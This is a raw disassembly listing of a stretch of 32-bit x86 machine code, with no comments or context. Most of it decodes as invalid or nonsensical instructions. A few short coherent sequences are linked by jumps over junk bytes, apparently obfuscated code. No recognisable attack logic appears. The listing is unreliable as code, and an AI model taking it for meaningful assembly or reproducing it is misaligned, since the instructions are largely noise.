  40211c:	push   edi
  40211d:	sar    DWORD PTR [ebp*2+0x622f8ce4],cl
  402124:	and    esi,0xffffff8e
  402127:	xchg   esi,eax
  402128:	scas   al,BYTE PTR es:[edi]
  402129:	pop    ecx
  40212a:	jge    0x4020b0
  40212c:	jo     0x402133
  40212e:	inc    ecx
  40212f:	cwde   
  402130:	or     DWORD PTR [ecx+ebx*8-0x4b],edi
  402134:	shl    DWORD PTR [eax+0x46],0x42
  402138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402139:	pop    edi
  40213a:	jge    0x40210f
  40213c:	hlt    
  40213d:	and    eax,0x895042b1
  402142:	int    0xee
  402144:	push   ebx
  402145:	(bad)  
  402146:	in     al,dx
  402147:	or     DWORD PTR ds:0x8095085d,eax
  40214d:	std    
  40214e:	xor    al,0x50
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	(bad)  
  40216a:	lea    edx,[edi]
  40216c:	scas   eax,DWORD PTR es:[edi]
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40218f
  402176:	sub    dh,BYTE PTR es:[edx+0xe]
  40217a:	cmp    DWORD PTR [edx+0x54f63335],edx
  402180:	pop    esi
  402181:	stos   BYTE PTR es:[edi],al
  402182:	jle    0x402198
  402184:	aaa    
  402185:	sti    
  402186:	lods   eax,DWORD PTR ds:[esi]
  402187:	shl    DWORD PTR [ebx+0x1f],1
  40218a:	push   ecx
  40218b:	sub    BYTE PTR [ebp-0x19965088],al
  402191:	adc    ah,cl
  402193:	in     al,dx
  402194:	mov    dl,0x9c
  402196:	cwde   
  402197:	cmp    DWORD PTR [ebp-0x5a9c0b2a],ecx
  40219d:	(bad)  
  40219e:	and    DWORD PTR [ebx+0x4723c8cc],ebp
  4021a4:	push   edi
  4021a5:	fwait
  4021a6:	test   al,0xd6
  4021a8:	inc    esi
  4021a9:	push   esp
  4021aa:	and    ebx,eax
  4021ac:	sbb    ah,ch
  4021ae:	arpl   WORD PTR [eax-0x6b],di
  4021b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021b2:	popf   
  4021b3:	inc    eax
  4021b4:	(bad)  
  4021b5:	ss mov dh,0x4e
  4021b8:	or     esi,DWORD PTR ds:0x3e50e7e8
  4021be:	dec    eax
  4021bf:	jno    0x40218d
  4021c1:	sbb    ecx,DWORD PTR [edi+0x4b]
  4021c4:	fst    QWORD PTR [ebp+0x13]
  4021c7:	add    al,0x7b
  4021c9:	pop    esp
  4021ca:	shr    BYTE PTR [ebx+0x4b213113],0x68
  4021d1:	adc    al,0xc
  4021d3:	mov    edx,0xdf05fa50
  4021d8:	cmp    al,0x72
  4021da:	add    al,0xa7
  4021dc:	mov    bh,0xb9
  4021de:	inc    esp
  4021df:	scas   eax,DWORD PTR es:[edi]
  4021e0:	ds loope 0x402172
  4021e3:	or     dh,BYTE PTR [esi+0x2d39661d]
  4021e9:	sbb    eax,0xed18e2bc
  4021ee:	mov    esi,0xe0aabd
  4021f3:	shl    ebp,cl
  4021f5:	pop    ebp
  4021f6:	mov    BYTE PTR [ecx-0x2e],0x9b
  4021fa:	mov    bh,0x70
  4021fc:	add    ecx,edi
  4021fe:	das    
  4021ff:	push   ebp
  402200:	adc    cl,dh
  402202:	jno    0x4021fc
  402204:	pop    eax
  402205:	dec    ebp
  402206:	icebp  
  402207:	in     al,dx
  402208:	push   edi
  402209:	xor    esp,DWORD PTR ds:0xc44bc942
  40220f:	sub    eax,0xaeb478d0
  402214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402215:	enter  0xf12,0xfd
  402219:	repz xchg edi,eax
  40221b:	mov    bh,0x3c
  40221d:	call   0x48f3:0x3fae3914
  402224:	nop
  402225:	clc    
  402226:	dec    edx
  402227:	pop    ebp
  402228:	mov    ecx,0x678fa13e
  40222d:	adc    DWORD PTR [edx+0x77d92dfa],ecx
  402233:	in     al,dx
  402234:	loopne 0x40225e
  402236:	sbb    BYTE PTR [ebx-0x47],dl
  402239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40223a:	xor    DWORD PTR [edi],esi
  40223c:	inc    esi
  40223d:	mov    al,ds:0x2b307ac
  402242:	cmp    DWORD PTR [ecx+edi*2-0x10],ebx
  402246:	push   0xfffffff1
  402248:	imul   edi,DWORD PTR [ecx-0x596ec28],0x77058467
  402252:	jmp    0x402268
  402254:	(bad)
  402257:	mov    ?,WORD PTR [esi]
  402259:	adc    BYTE PTR [esi],al
  40225b:	adc    dl,bl
  40225d:	push   edi
  40225e:	fisubr WORD PTR [eax+0x611d8814]
  402264:	add    eax,0x126e03bb
  402269:	mov    ds:0x40de9b72,al
  40226e:	ins    DWORD PTR es:[edi],dx
  40226f:	loope  0x402232
  402271:	xchg   BYTE PTR ds:0x4c07a655,bh
  402277:	js     0x402214
  402279:	jbe    0x4022ef
  40227b:	hlt    
  40227c:	add    cl,al
  40227e:	dec    esp
  40227f:	add    edi,DWORD PTR [esi-0x5f]
  402282:	(bad)  
  402283:	aaa    
  402284:	push   ebp
  402285:	sbb    al,0xf8
  402287:	clc    
  402288:	jmp    0x8d20:0xf0f0f89
  40228f:	pop    ebx
  402290:	add    esp,ebp
  402292:	sub    ecx,esi
  402294:	xchg   ecx,eax
  402295:	fwait
  402296:	xlat   BYTE PTR ds:[ebx]
  402297:	in     al,0xdf
  402299:	rcr    BYTE PTR [eax-0x2a],cl
  40229c:	fwait
  40229d:	mov    bh,0x6b
  40229f:	cdq    
  4022a0:	add    al,BYTE PTR [eax-0x705ca13e]
  4022a6:	(bad)  
  4022a7:	mov    edi,0x98f23883
  4022ac:	aam    0x3d
  4022ae:	adc    dh,BYTE PTR [esi]
  4022b0:	push   0xa4715857
  4022b5:	pop    ss
  4022b6:	adc    al,0xa7
  4022b8:	pop    esp
  4022b9:	sub    ecx,DWORD PTR [esi]
  4022bb:	or     dh,BYTE PTR [eax-0x2893e08a]
  4022c1:	xchg   edx,eax
  4022c2:	bound  ebx,QWORD PTR [edi-0x34]
  4022c5:	xlat   BYTE PTR ds:[ebx]
  4022c6:	loope  0x4022fc
  4022c8:	mov    edi,0x6f5bf8a8
  4022cd:	push   ebp
  4022ce:	add    dh,dh
  4022d0:	and    al,0xee
  4022d2:	xchg   esi,eax
  4022d3:	pop    ebp
  4022d4:	fwait
  4022d5:	pop    ebp
  4022d6:	int    0x60
  4022d8:	iret   
  4022d9:	into   
  4022da:	test   BYTE PTR [esi+0x66637ed1],0x67
  4022e1:	mov    edx,0x9b4030a1
  4022e6:	(bad)  
  4022e7:	repnz lds esi,FWORD PTR [ebp-0x7d]
  4022eb:	sub    bh,BYTE PTR [edx+0x35]
  4022ee:	lahf   
  4022ef:	fst    QWORD PTR [edx]
  4022f1:	mov    bh,0x89
  4022f3:	mov    ds:0xf097c336,al
  4022f8:	nop
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	mov    ecx,0x9add340a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402323
  402364:	push   ecx
  402365:	div    BYTE PTR [eax+0x2d030ba0]
  40236b:	stc    
  40236c:	lahf   
  40236d:	hlt    
  40236e:	scas   al,BYTE PTR es:[edi]
  40236f:	rcl    edi,1
  402371:	push   cs
  402372:	sub    al,bh
  402374:	(bad)  
  402376:	cli    
  402377:	jecxz  0x402398
  402379:	add    esp,DWORD PTR [edx+0x3622a03f]
  40237f:	push   eax
  402380:	mov    ds:0x83e6b938,al
  402385:	push   edi
  402386:	cs push es
  402388:	ds cli 
  40238a:	outs   dx,BYTE PTR ds:[esi]
  40238b:	ins    BYTE PTR es:[edi],dx
  40238c:	push   esp
  40238d:	adc    eax,0x9daa8732
  402392:	out    dx,al
  402393:	add    cl,BYTE PTR [edi+eax*1]
  402396:	sub    eax,DWORD PTR ds:0xfbad5da8
  40239c:	imul   ecx,edi,0xffffff92
  40239f:	pop    ecx
  4023a0:	mov    al,0x5b
  4023a2:	dec    eax
  4023a3:	mov    edx,0x2692406c
  4023a8:	adc    dl,BYTE PTR [ecx+0x42ecf421]
  4023ae:	mov    edx,0xbd424fba
  4023b3:	or     dl,ch
  4023b5:	push   ds
  4023b6:	sbb    BYTE PTR [eax+eax*2],bh
  4023b9:	adc    al,0x40
  4023bb:	mov    DWORD PTR [ecx-0x3f23ae3],ebx
  4023c1:	bt     DWORD PTR [esi-0x54],esi
  4023c5:	repz fidivr DWORD PTR [ecx+eax*4]
  4023c9:	or     eax,0xeea09e5d
  4023ce:	dec    edx
  4023cf:	and    al,0x28
  4023d1:	cwde   
  4023d2:	div    DWORD PTR [edi]
  4023d4:	test   DWORD PTR [ebp+0x7f7d1614],ecx
  4023da:	pop    es
  4023db:	shl    DWORD PTR [eax],0x32
  4023de:	mov    bh,0x23
  4023e0:	cdq    
  4023e1:	jno    0x4023d7
  4023e3:	shr    DWORD PTR [eax],1
  4023e5:	or     ah,BYTE PTR [ebx-0x20b2d412]
  4023eb:	push   esp
  4023ec:	fs xchg esp,eax
  4023ee:	sbb    al,0xc4
  4023f0:	call   0x42bb8dc0
  4023f5:	outs   dx,BYTE PTR ds:[esi]
  4023f6:	cdq    
  4023f7:	and    al,0xf4
  4023f9:	pop    edx
  4023fa:	xchg   ebx,eax
  4023fb:	xor    BYTE PTR [ebp+esi*1+0x780b237],dl
  402402:	(bad)  
  402404:	adc    DWORD PTR ds:[eax+0x29],ebx
  402408:	sub    al,0x4e
  40240a:	and    eax,0x8a6277d9
  40240f:	mov    edi,edi
  402411:	std    
  402412:	icebp  
  402413:	sub    ebp,DWORD PTR [ecx-0xe074fbe]
  402419:	sbb    al,0x8d
  40241b:	add    al,0x8c
  40241d:	xchg   esi,eax
  40241e:	add    DWORD PTR [eax+0x6dadc865],edx
  402424:	pop    ebx
  402425:	stos   BYTE PTR es:[edi],al
  402426:	scas   al,BYTE PTR es:[edi]
  402427:	jb     0x4023d2
  402429:	mov    esp,0x6d1567cc
  40242e:	lock call 0x17ab:0xf163f028
  402436:	jae    0x40242d
  402438:	lds    eax,FWORD PTR [edx+0x30]
  40243b:	inc    ebp
  40243c:	ss xchg ebp,eax
  40243e:	sub    BYTE PTR [eax+0xc],bh
  402441:	and    eax,0xc9e010b5
  402446:	add    BYTE PTR [esi+0x6],0x9e
  40244a:	mov    ebx,0xf0165a1a
  40244f:	mov    eax,ds:0xfd61062e
  402454:	aam    0x31
  402456:	mov    edi,0x60ec108
  40245b:	js     0x402486
  40245d:	sbb    eax,0x28b45b73
  402462:	and    esi,DWORD PTR [eax+0x5a]
  402465:	sub    eax,0x4f867e5e
  40246a:	or     esp,DWORD PTR [esi+0x3f]
  40246d:	enter  0xd77e,0x8f
  402471:	add    eax,0xc9483061
  402476:	popa   
  402477:	in     eax,0xb4
  402479:	dec    esp
  40247a:	sbb    bl,BYTE PTR [ebx-0x4f]
  40247d:	add    eax,0xb4c6d812
  402482:	mov    eax,0x1654feed
  402487:	aam    0x8d
  402489:	inc    esp
  40248a:	dec    ebp
  40248b:	and    DWORD PTR [edi+0x4c],edi
  40248e:	or     bh,BYTE PTR fs:[esi]
  402491:	(bad)  
  402493:	and    edi,DWORD PTR [esi]
  402495:	inc    ebx
  402496:	jne    0x4024a9
  402498:	jmp    0x402519
  40249a:	pusha  
  40249b:	mov    ds:0x236451f5,eax
  4024a0:	pop    ds
  4024a1:	mov    dh,0xb
  4024a3:	push   edi
  4024a4:	std    
  4024a5:	sbb    al,0x30
  4024a7:	mov    esp,0x80562e0a
  4024ac:	ja     0x402472
  4024ae:	jno    0x40247e
  4024b0:	adc    edx,DWORD PTR [esi]
  4024b2:	fmulp  st(6),st
  4024b4:	cs mov esi,cs
  4024b7:	xchg   edx,eax
  4024b8:	or     eax,0xbf75e7e1
  4024bd:	xor    al,0x77
  4024bf:	fcmovnu st,st(3)
  4024c1:	mov    cl,al
  4024c3:	es sti 
  4024c5:	(bad)  [edi-0x68db09c3]
  4024cb:	imul   ebp,DWORD PTR [ebx+ebp*4-0x55],0x9670374c
  4024d3:	das    
  4024d4:	clc    
  4024d5:	pusha  
  4024d6:	xchg   edx,eax
  4024d7:	repz xchg edi,eax
  4024d9:	jo     0x40247e
  4024db:	mov    dl,0xfa
  4024dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024de:	hlt    
  4024df:	push   edx
  4024e0:	inc    edx
  4024e1:	mov    al,ds:0xcd256bb
  4024e6:	mov    eax,DWORD PTR ds:[ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	stos   DWORD PTR es:[edi],eax
  40250e:	mov    esp,0x126befa
  402513:	jle    0x402593
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40255b
  40251a:	mov    BYTE PTR [ebx],bh
  40251c:	imul   eax,DWORD PTR [esp+ebp*4+0x6d],0x356be2aa
  402524:	hlt    
  402525:	cmp    ebx,DWORD PTR [ebx+0x15]
  402528:	mov    ah,0x41
  40252a:	add    BYTE PTR [esi+0x17],dl
  40252d:	clc    
  40252e:	arpl   WORD PTR [eax+esi*2],ax
  402531:	iret   
  402532:	mov    BYTE PTR [esi+0x18],cl
  402535:	into   
  402536:	inc    eax
  402537:	loop   0x402521
  402539:	addr16 test eax,0xf77af077
  40253f:	arpl   WORD PTR [edx+0x3790120b],si
  402545:	cdq    
  402546:	ds addr16 jmp 0x619f5608
  40254d:	lock aad 0x3f
  402550:	jb     0x402599
  402552:	in     al,dx
  402553:	nop
  402554:	xchg   esp,eax
  402555:	dec    ecx
  402556:	adc    dh,BYTE PTR [esi]
  402558:	ins    DWORD PTR es:[edi],dx
  402559:	jle    0x40258f
  40255b:	dec    esp
  40255c:	cmp    DWORD PTR [esp+eiz*8+0x68c8a6e0],esi
  402563:	mov    ds:0x54771ba6,eax
  402568:	jbe    0x4025b2
  40256a:	mov    al,ds:0x4a2960ab
  40256f:	aad    0xcb
  402571:	lahf   
  402572:	ins    BYTE PTR es:[edi],dx
  402573:	mov    edx,0xb66eadfc
  402578:	not    BYTE PTR [edx+eiz*1-0x5d35c7bf]
  40257f:	fwait
  402580:	dec    ebx
  402581:	cld    
  402582:	enter  0xedc7,0x79
  402586:	call   0x1bda4eaf
  40258b:	mov    esi,0xd3e3744e
  402590:	sub    dh,BYTE PTR [edi]
  402592:	not    BYTE PTR [esp+edx*8+0x389c292c]
  402599:	loopne 0x40258c
  40259b:	stc    
  40259c:	xlat   BYTE PTR ds:[ebx]
  40259d:	in     eax,dx
  40259e:	push   ecx
  40259f:	mov    bl,0xaf
  4025a1:	sub    bh,BYTE PTR [edi]
  4025a3:	push   edi
  4025a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a5:	fistp  WORD PTR [ebp-0x19]
  4025a8:	mov    ah,0x68
  4025aa:	sbb    ch,BYTE PTR [ebp+eax*2+0x7]
  4025ae:	dec    ebp
  4025af:	mov    gs,WORD PTR [ebx+eax*1-0x50]
  4025b3:	ja     0x402582
  4025b5:	xor    BYTE PTR [ebp-0x4dd72726],0xec
  4025bc:	pop    ebx
  4025bd:	sbb    al,0xb0
  4025bf:	rcpps  xmm3,XMMWORD PTR [ecx+0x52]
  4025c3:	jne    0x402585
  4025c5:	loop   0x402624
  4025c7:	ds or  ebp,ebx
  4025ca:	mov    eax,0x8a89e75a
  4025cf:	lahf   
  4025d0:	rcr    edi,0x92
  4025d3:	pop    es
  4025d4:	dec    esp
  4025d5:	popf   
  4025d6:	or     edx,DWORD PTR [edi+0x12]
  4025d9:	ja     0x40263d
  4025db:	out    0x8d,al
  4025dd:	retf   0x6581
  4025e0:	or     ebp,DWORD PTR [edi]
  4025e2:	out    0xbd,al
  4025e4:	(bad)
  4025e7:	mov    ebx,0x99d7b571
  4025ec:	retf   0xd10a
  4025ef:	inc    esi
  4025f0:	sbb    edx,DWORD PTR [ebx-0x67]
  4025f3:	xchg   edi,eax
  4025f4:	sbb    al,0xd9
  4025f6:	pop    ecx
  4025f7:	xor    eax,0xc8753cf1
  4025fc:	inc    ebx
  4025fd:	movs   DWORD PTR es:[di],DWORD PTR ss:[si]
  402600:	(bad)  
  402601:	sbb    esp,DWORD PTR [esi-0x26]
  402604:	jno    0x40265e
  402606:	aam    0xc2
  402608:	std    
  402609:	adc    eax,0xd081b7f6
  40260e:	and    eax,0x8c4db492
  402613:	repnz (bad) 
  402615:	out    0x49,eax
  402617:	jl     0x4025dd
  402619:	rcr    DWORD PTR ds:0xf88400d9,cl
  40261f:	pop    esi
  402620:	ins    DWORD PTR es:[edi],dx
  402621:	shr    DWORD PTR ds:0x894adbde,cl
  402627:	test   BYTE PTR [ebx],al
  402629:	test   eax,0x5168a079
  40262e:	(bad)  
  40262f:	push   eax
  402630:	mov    BYTE PTR ds:0x6c3c28a9,0x30
  402637:	sub    eax,DWORD PTR [edi+0x23]
  40263a:	add    BYTE PTR [esp+ebx*1-0x64],0x60
  40263f:	inc    ebx
  402640:	out    dx,eax
  402641:	nop
  402642:	repnz mov DWORD PTR [eax-0x6b],edx
  402646:	daa    
  402647:	repnz fsubr QWORD PTR [ecx+0x31d46ec1]
  40264e:	xchg   esi,eax
  40264f:	mov    al,0xce
  402651:	pop    ds
  402652:	xor    DWORD PTR [ebx+0x72],ebp
  402655:	xchg   ecx,eax
  402656:	mov    ecx,0xa315ff01
  40265b:	pop    ds
  40265c:	or     esp,esi
  40265e:	fdivr  st,st(4)
  402660:	mov    ebx,0x65db9df6
  402665:	(bad)  
  402666:	in     al,dx
  402667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402668:	(bad)  
  402669:	mov    al,ds:0x5b6def4b
  40266e:	fnstsw WORD PTR [ebp+0x44c6e54a]
  402674:	ret    
  402675:	mov    ds:0x8c55a337,al
  40267a:	xchg   esi,eax
  40267b:	fiadd  DWORD PTR [esi-0x57b0295b]
  402681:	push   cs
  402682:	mov    BYTE PTR [ebx-0x54],bh
  402685:	in     al,0x71
  402687:	sub    BYTE PTR [ebp+0x2],al
  40268a:	stc    
  40268b:	cmp    al,0x5e
  40268d:	jmp    0x5d3d:0x4c246451
  402694:	rcr    DWORD PTR [esi+0x6a],cl
  402697:	fidivr DWORD PTR [edi+0x775847db]
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	push   ebp
  4026d3:	test   eax,0xea2aba2
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026f8
  4026df:	rcr    DWORD PTR [esi+0x5a],cl
  4026e2:	popa   
  4026e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e4:	sbb    esp,esi
  4026e6:	sar    DWORD PTR [ebx+0x2e],1
  4026e9:	push   ebp
  4026ea:	shl    edx,cl
  4026ec:	jae    0x4026e5
  4026ee:	in     al,0xb
  4026f0:	or     DWORD PTR ds:0x872f13f1,edi
  4026f6:	outs   dx,BYTE PTR ds:[esi]
  4026f7:	xchg   ecx,eax
  4026f8:	mov    dh,0xf2
  4026fa:	jae    0x402722
  4026fc:	es dec ecx
  4026fe:	fadd   QWORD PTR [edi+0x6d0d53a5]
  402704:	cmp    eax,DWORD PTR [ebx+0x14]
  402707:	and    ecx,DWORD PTR [ebx]
  402709:	add    edi,esp
  40270b:	jge    0x40276e
  40270d:	and    esi,DWORD PTR [eax]
  40270f:	js     0x4026f8
  402711:	into   
  402712:	dec    ecx
  402713:	test   eax,0x326b1176
  402718:	mov    DWORD PTR [eax-0xa],ebp
  40271b:	and    dh,cl
  40271d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40271e:	pop    ds
  40271f:	dec    edx
  402720:	or     edx,DWORD PTR [esi+eiz*2+0x16]
  402724:	sti    
  402725:	pushf  
  402726:	push   0xab897020
  40272b:	or     eax,eax
  40272d:	inc    ecx
  40272e:	call   0xd20fb839
  402733:	cs (bad) 
  402735:	mov    gs:0x614467d7,al
  40273b:	push   es
  40273c:	cmp    al,0x9b
  40273e:	shl    BYTE PTR [eax-0x4d],cl
  402741:	iret   
  402742:	addr16 mov ecx,0xfc4546e1
  402748:	add    edx,DWORD PTR [bp+0x40a]
  40274d:	cld    
  40274e:	cmp    ch,al
  402750:	or     al,0xf3
  402752:	dec    bx
  402754:	ror    DWORD PTR [edi+0x6a],1
  402757:	add    BYTE PTR [ebp+0x13cb65d1],0x2b
  40275e:	sahf   
  40275f:	mov    ecx,0xbab5f10b
  402764:	(bad)  
  402765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402766:	int3   
  402767:	fwait
  402768:	mov    fs,WORD PTR [edx]
  40276a:	jbe    0x40277a
  40276c:	data16 mov cl,0x8e
  40276f:	stos   DWORD PTR es:[edi],eax
  402770:	and    eax,0x9f7cb3cd
  402775:	cmp    ebp,DWORD PTR [ebx-0x54]
  402778:	and    al,dl
  40277a:	fild   QWORD PTR [ebx]
  40277c:	fild   QWORD PTR [edi]
  40277e:	out    0x29,eax
  402780:	inc    eax
  402781:	shr    DWORD PTR ds:0x20771bd5,cl
  402787:	enter  0x5854,0xc4
  40278b:	lahf   
  40278c:	pop    esi
  40278d:	or     esp,DWORD PTR [edx+0xd]
  402790:	test   al,0x73
  402792:	hlt    
  402793:	aaa    
  402794:	test   eax,0x2d0cd42f
  402799:	or     DWORD PTR [eax+0x69047403],edx
  40279f:	fsub   DWORD PTR [edx+ebx*2+0x742a3ef3]
  4027a6:	not    DWORD PTR [esi-0x23]
  4027a9:	mov    al,ds:0x585cc3e8
  4027ae:	(bad)  
  4027af:	js     0x4027a2
  4027b1:	fwait
  4027b2:	lahf   
  4027b3:	mov    al,ds:0x571d9ad5
  4027b8:	les    esi,FWORD PTR [edx-0x70bc96a9]
  4027be:	mov    cl,0x98
  4027c0:	call   0x9f5ac9bb
  4027c5:	push   ds
  4027c6:	and    bl,BYTE PTR [ecx]
  4027c8:	mov    al,ds:0x50556f5f
  4027cd:	in     eax,dx
  4027ce:	dec    eax
  4027cf:	ds cld 
  4027d1:	scas   al,BYTE PTR es:[edi]
  4027d2:	in     al,dx
  4027d3:	jle    0x40282e
  4027d5:	and    esi,DWORD PTR [esi+0x1f]
  4027d8:	adc    DWORD PTR [ecx*1+0x701758e9],esi
  4027df:	(bad)  
  4027e0:	mov    al,0x4b
  4027e2:	push   ds
  4027e3:	sbb    dl,ah
  4027e5:	leave  
  4027e6:	in     eax,0xa9
  4027e8:	outs   dx,DWORD PTR ds:[esi]
  4027e9:	jns    0x4027a2
  4027eb:	scas   eax,DWORD PTR es:[edi]
  4027ec:	in     al,0x30
  4027ee:	cs sub al,0xd1
  4027f1:	xchg   edx,eax
  4027f2:	test   al,0xa2
  4027f4:	mov    bh,al
  4027f6:	push   ecx
  4027f7:	int    0x2a
  4027f9:	in     eax,dx
  4027fa:	out    dx,eax
  4027fb:	xor    BYTE PTR [eax-0x46],dh
  4027fe:	ss rcr al,1
  402801:	pop    ebp
  402802:	and    eax,0x349b5f2
  402807:	xchg   esp,eax
  402808:	fsubr  QWORD PTR ds:0x7d8e6c51
  40280e:	inc    esi
  40280f:	xor    al,0x43
  402811:	cmc    
  402812:	cmc    
  402813:	sbb    DWORD PTR [eax+0x6e],ecx
  402816:	ins    BYTE PTR es:[edi],dx
  402817:	jle    0x402817
  402819:	push   edx
  40281a:	mov    al,0xea
  40281c:	xchg   BYTE PTR [ecx-0x27],dh
  40281f:	pop    ecx
  402820:	rcl    DWORD PTR [eax+0x28bdd559],0xa8
  402827:	inc    eax
  402828:	jmp    0x1be7:0xe887f29
  40282f:	sub    eax,DWORD PTR ds:0x14b49499
  402835:	mov    esp,0x5391175d
  40283a:	push   0xc6986352
  40283f:	push   esp
  402840:	daa    
  402841:	xchg   edx,eax
  402842:	bnd call 0x40cd4430
  402848:	sbb    eax,0xa2174b83
  40284d:	scas   eax,DWORD PTR es:[edi]
  40284e:	sbb    eax,0x5e7b4f06
  402853:	push   esp
  402854:	cmp    eax,0xc61f5d9a
  402859:	dec    edi
  40285a:	outs   dx,DWORD PTR ds:[esi]
  40285b:	sbb    al,0xb5
  40285d:	mov    BYTE PTR [ecx-0x3e],dl
  402860:	icebp  
  402861:	jmp    0xf84d:0x8bd0458b
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	jge    0x40281a
  402885:	(bad)  
  402886:	pop    ds
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402900
  402890:	and    BYTE PTR [edx+ecx*2],cl
  402893:	fimul  DWORD PTR [edi+0x17]
  402896:	sub    eax,DWORD PTR [eax]
  402898:	mov    ds:0x90523eb5,eax
  40289d:	add    al,0x12
  40289f:	outs   dx,DWORD PTR ds:[esi]
  4028a0:	inc    edi
  4028a1:	mov    edi,0x385f3c81
  4028a6:	cmp    DWORD PTR [esi],edi
  4028a8:	clc    
  4028a9:	gs jmp 0x906e:0x49fe6fed
  4028b1:	mov    es,WORD PTR [edi+0x1b]
  4028b4:	nop
  4028b5:	jecxz  0x402895
  4028b7:	xchg   dl,dh
  4028b9:	ret    0x713c
  4028bc:	push   ds
  4028bd:	sub    eax,0xc5088049
  4028c2:	ficomp DWORD PTR [edx-0x5453c5dd]
  4028c8:	mov    dh,0xd4
  4028ca:	jo     0x402891
  4028cc:	inc    ebp
  4028cd:	(bad)  
  4028ce:	jne    0x402889
  4028d0:	or     eax,0x9ae4490e
  4028d5:	test   BYTE PTR [ecx+0x45],cl
  4028d8:	push   0x4d7fc00a
  4028dd:	out    dx,al
  4028de:	push   ecx
  4028df:	adc    eax,0x751582ad
  4028e4:	sbb    al,0x12
  4028e6:	and    ch,0x81
  4028e9:	out    dx,eax
  4028ea:	mov    edx,0xcf55536a
  4028ef:	mov    esi,0x7e74f42
  4028f4:	je     0x4028a9
  4028f6:	rcr    DWORD PTR [edx-0x2e5d050b],0x43
  4028fd:	(bad)  
  4028fe:	fidivr DWORD PTR ds:0x5fa1985e
  402904:	rol    BYTE PTR [edx+0x477e2795],0x2e
  40290b:	imul   BYTE PTR [edi]
  40290d:	jg     0x4028da
  40290f:	lods   al,BYTE PTR ds:[esi]
  402910:	push   cs
  402911:	aaa    
  402912:	pusha  
  402913:	inc    eax
  402914:	jmp    0xf4e8c24a
  402919:	gs xchg ebx,eax
  40291b:	push   ebx
  40291c:	cwde   
  40291d:	scas   al,BYTE PTR es:[edi]
  40291e:	lea    edx,[eax+0x35]
  402921:	fld    QWORD PTR [esi+0xfb5fe22]
  402927:	xor    ebx,edx
  402929:	pop    edx
